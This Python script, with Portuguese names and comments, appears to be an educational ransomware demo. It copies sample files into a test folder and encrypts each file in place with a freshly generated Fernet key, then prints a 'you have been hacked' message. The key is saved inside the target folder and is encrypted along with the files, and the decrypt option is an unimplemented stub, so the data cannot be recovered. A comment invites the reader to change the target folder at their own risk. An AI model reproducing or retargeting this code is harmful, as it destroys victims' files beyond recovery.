import os
import shutil

from cryptography.fernet import Fernet


def garanta_existencia_diretorio(diretorio: str) -> None:
    diretorio_exemplos: str = './exemplos'
    if os.path.exists(diretorio):
        print(f'Diretório {diretorio} já existe. Sobrescrendo.')
        shutil.rmtree(diretorio)
    else:
        print(f'Criando diretório {diretorio}...')

    print(f'Copiando arquivos de {diretorio_exemplos} para {diretorio}...')
    shutil.copytree(diretorio_exemplos, diretorio)
    print('Arquivos copiados com sucesso!')


def criptografe_diretorio(diretorio: str) -> None:
    key = Fernet.generate_key()

    with open(f'{diretorio}/keys.rans', 'wb') as filekey:
        filekey.write(key)

    for nome_arquivo in os.listdir(diretorio):
        caminho_arquivo = f'{diretorio}/{nome_arquivo}'
        with open(caminho_arquivo, 'rb') as arquivo:
            texto = arquivo.read()

        f = Fernet(key)
        texto_criptografado = f.encrypt(texto)

        with open(caminho_arquivo, 'wb') as arquivo:
            arquivo.write(texto_criptografado)


def descriptografe_diretorio(diretorio: str) -> None:
    print(f'Descriptografando diretório {diretorio}...')


if __name__ == '__main__':
    # Apesar de o código ser flexível o suficiente para criptografar qualquer diretório, estamos setando um diretório
    # específico para evitar que o ransomware criptografe diretórios importantes do sistema operacional.
    # Altere o diretório por sua conta e risco.

    DIRETORIO_TESTE: str = './ransomware_tmp'
    print('O que você deseja fazer?')
    opcao: int = -1
    while opcao != 0:
        print('1 - Criptografar')
        print('2 - Descriptografar')
        print('0 - Sair')
        opcao = int(input('Digite a opção desejada: '))

        if opcao == 1:
            garanta_existencia_diretorio(DIRETORIO_TESTE)
            criptografe_diretorio(DIRETORIO_TESTE)
            print(f'Você foi hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram criptografados!')
        elif opcao == 2:
            descriptografe_diretorio(DIRETORIO_TESTE)
            print('Descriptografando...')
        elif opcao == 0:
            print('Até mais!')
        else:
            print('Opção inválida!')
